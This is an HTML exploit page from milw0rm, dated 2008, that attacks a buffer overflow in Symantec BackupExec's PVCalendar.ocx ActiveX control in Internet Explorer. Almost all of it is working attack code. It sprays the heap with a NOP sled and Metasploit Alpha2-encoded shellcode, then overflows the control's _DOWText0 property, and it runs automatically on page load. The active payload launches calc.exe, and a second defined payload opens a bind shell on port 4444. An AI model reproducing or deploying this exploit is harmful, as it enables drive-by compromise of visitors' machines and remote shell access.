<!-- 
Symantec BackupExec Calendar Control(PVCalendar.ocx) BoF Exploit
Vulnerability discovered by JJ Reyes of Secunia Research
http://secunia.com/advisories/27885/
written by e.b.
Tested on Windows XP SP2(fully patched) English, IE6 and IE7, PVCalendar.ocx version 10.0.0.17
Thanks to h.d.m. and the Metasploit crew 
-->
<html>
 <head>
  <title>Symantec BackupExec Calendar Control(PVCalendar.ocx) BoF Exploit</title>
  <script language="JavaScript" defer>
    function Check() {
     
   


// win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 Encoder=Alpha2 http://metasploit.com 
var shellcode1 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
                          "%u4948%u4949%u4949%u4949%u4949%u4949%u5a51%u436a" +
                          "%u3058%u3142%u4250%u6b41%u4142%u4253%u4232%u3241" +
                          "%u4141%u4130%u5841%u3850%u4242%u4875%u6b69%u4d4c" +
                          "%u6338%u7574%u3350%u6730%u4c70%u734b%u5775%u6e4c" +
                          "%u636b%u454c%u6355%u3348%u5831%u6c6f%u704b%u774f" +
                          "%u6e68%u736b%u716f%u6530%u6a51%u724b%u4e69%u366b" +
                          "%u4e54%u456b%u4a51%u464e%u6b51%u4f70%u4c69%u6e6c" +
                          "%u5964%u7350%u5344%u5837%u7a41%u546a%u334d%u7831" +
                          "%u4842%u7a6b%u7754%u524b%u6674%u3444%u6244%u5955" +
                          "%u6e75%u416b%u364f%u4544%u6a51%u534b%u4c56%u464b" +
                          "%u726c%u4c6b%u534b%u376f%u636c%u6a31%u4e4b%u756b" +
                          "%u6c4c%u544b%u4841%u4d6b%u5159%u514c%u3434%u4a44" +
                          "%u3063%u6f31%u6230%u4e44%u716b%u5450%u4b70%u6b35" +
                          "%u5070%u4678%u6c6c%u634b%u4470%u4c4c%u444b%u3530" +
                          "%u6e4c%u6c4d%u614b%u5578%u6a58%u644b%u4e49%u6b6b" +
                          "%u6c30%u5770%u5770%u4770%u4c70%u704b%u4768%u714c" +
                          "%u444f%u6b71%u3346%u6650%u4f36%u4c79%u6e38%u4f63" +
                          "%u7130%u306b%u4150%u5878%u6c70%u534a%u5134%u334f" +
                          "%u4e58%u3978%u6d6e%u465a%u616e%u4b47%u694f%u6377" +
                          "%u4553%u336a%u726c%u3057%u5069%u626e%u7044%u736f" +
                          "%u4147%u4163%u504c%u4273%u3159%u5063%u6574%u7035" +
                          "%u546d%u6573%u3362%u306c%u4163%u7071%u536c%u6653" +
                          "%u314e%u7475%u7038%u7765%u4370");

// win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com 
var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
                          "%u4949%u4949%u4949%u4949%u4949%u4937%u5a51%u436a" +
                          "%u3058%u3142%u4150%u6b42%u4141%u4153%u4132%u3241" +
                          "%u4142%u4230%u5841%u3850%u4241%u7875%u4b69%u724c" +
                          "%u584a%u526b%u4a6d%u4a48%u6b59%u6b4f%u694f%u416f" +
                          "%u4e70%u526b%u744c%u4164%u6e34%u376b%u5535%u4c6c" +
                          "%u714b%u646c%u6145%u7468%u6a41%u6e4f%u626b%u326f" +
                          "%u6c38%u334b%u376f%u5550%u7851%u316b%u6c59%u504b" +
                          "%u6e34%u466b%u6861%u456e%u6f61%u6c30%u6c59%u6b6c" +
                          "%u3934%u4150%u3764%u6877%u6941%u565a%u636d%u4b31" +
                          "%u7872%u6c6b%u7534%u566b%u3134%u5734%u5458%u6b35" +
                          "%u6e55%u336b%u556f%u7474%u7841%u416b%u4c76%u464b" +
                          "%u626c%u6e6b%u416b%u354f%u564c%u6861%u666b%u3663" +
                          "%u6c4c%u6b4b%u7239%u444c%u5764%u616c%u4f71%u4733" +
                          "%u6b41%u336b%u4c54%u634b%u7073%u6c30%u534b%u6470" +
                          "%u6c4c%u724b%u4550%u4e4c%u6c4d%u374b%u7530%u7358" +
                          "%u426e%u4c48%u524e%u466e%u586e%u566c%u3930%u586f" +
                          "%u7156%u4676%u7233%u6346%u3058%u7033%u3332%u5458" +
                          "%u5237%u4553%u5162%u504f%u4b54%u5a4f%u3370%u6a58" +
                          "%u686b%u596d%u456c%u466b%u4930%u596f%u7346%u4e6f" +
                          "%u5869%u7365%u4d56%u5851%u366d%u6468%u7242%u7275" +
                          "%u674a%u5972%u6e6f%u7230%u4a48%u5679%u6b69%u6e45" +
                          "%u764d%u6b37%u584f%u3356%u3063%u5053%u7653%u7033" +
                          "%u3353%u5373%u3763%u5633%u6b33%u5a4f%u3270%u5046" +
                          "%u3568%u7141%u304c%u3366%u6c63%u6d49%u6a31%u7035" +
                          "%u6e68%u3544%u524a%u4b50%u7177%u4b47%u4e4f%u3036" +
                          "%u526a%u3130%u7041%u5955%u6e6f%u3030%u6c68%u4c64" +
                          "%u546d%u796e%u3179%u5947%u596f%u4646%u6633%u6b35" +
                          "%u584f%u6350%u4b58%u7355%u4c79%u4146%u6359%u4b67" +
                          "%u784f%u7656%u5330%u4164%u3344%u7965%u4e6f%u4e30" +
                          "%u7173%u5878%u6167%u6969%u7156%u6269%u3977%u6a6f" +
                          "%u5176%u4945%u4e6f%u5130%u5376%u715a%u7274%u6246" +
                          "%u3048%u3063%u6c6d%u5a49%u6345%u625a%u7670%u3139" +
                          "%u5839%u4e4c%u4d69%u5337%u335a%u4e74%u4b69%u5652" +
                          "%u4b51%u6c70%u6f33%u495a%u336e%u4472%u6b6d%u374e" +
                          "%u7632%u6e4c%u6c73%u704d%u767a%u6c58%u4e6b%u4c4b" +
                          "%u736b%u5358%u7942%u6d6e%u7463%u6b56%u304f%u7075" +
                          "%u4b44%u794f%u5346%u706b%u7057%u7152%u5041%u4251" +
                          "%u4171%u337a%u4231%u4171%u5141%u6645%u6931%u5a6f" +
                          "%u5070%u6e68%u5a4d%u5679%u6865%u334e%u3963%u586f" +
                          "%u6356%u4b5a%u4b4f%u704f%u4b37%u4a4f%u4c70%u614b" +
                          "%u6b47%u4d4c%u6b53%u3174%u4974%u596f%u7046%u5952" +
                          "%u4e6f%u6330%u6c58%u6f30%u577a%u6174%u324f%u4b73" +
                          "%u684f%u3956%u386f%u4350");


	var bigblock = unescape("%u9090%u9090");
	var headersize = 20;
	var slackspace = headersize + shellcode1.length;
	while (bigblock.length < slackspace) bigblock += bigblock;
	var fillblock = bigblock.substring(0,slackspace);
	var block = bigblock.substring(0,bigblock.length - slackspace);
	while (block.length + slackspace < 0x40000) block = block + block + fillblock;

	

	var memory = new Array();
	for (i = 0; i < 350; i++){ memory[i] = block + shellcode1 }
	
	var buf = ""
	for (i = 0; i < 260; i++) { buf = buf + unescape("%0A") }
	
	obj._DOWText0 = buf;
	obj.Save("someFile",0);
	
	
 } 
   
   </script>
  </head>
 <body onload="JavaScript: return Check();">
	<object id="obj" classid="clsid:22ACD16F-99EB-11D2-9BB3-00400561D975">
		Unable to create object
	</object>
 </body>
</html>

# milw0rm.com [2008-02-29]
